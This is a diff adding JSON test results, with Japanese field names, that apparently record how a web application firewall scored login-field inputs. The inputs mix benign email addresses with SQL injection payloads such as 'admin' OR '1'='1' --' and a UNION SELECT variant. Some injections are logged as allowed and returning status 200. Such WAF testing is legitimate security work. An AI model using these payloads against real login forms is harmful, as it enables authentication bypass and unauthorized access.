+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1'%23",
+        "スコア": 30,
+        "アラートレベル": "medium-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin' OR '1'='1'-- -",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' /*",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' #",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "test@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "yamada.taro@gmail.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR ''='', ''=''' OR '1'='1' --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR ''='' OR '1'='1' UNION SELECT null,null--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR ''='' OR '1'='1' --+ ",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin' OR 1=1 LIMIT 1--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' /*",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin' OR '1'='1'#",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' %23",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR ''='' OR 1=1--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin' OR '1'='1'/* ",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "test@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "test@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "yamada.taro@gmail.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
     }
 ]
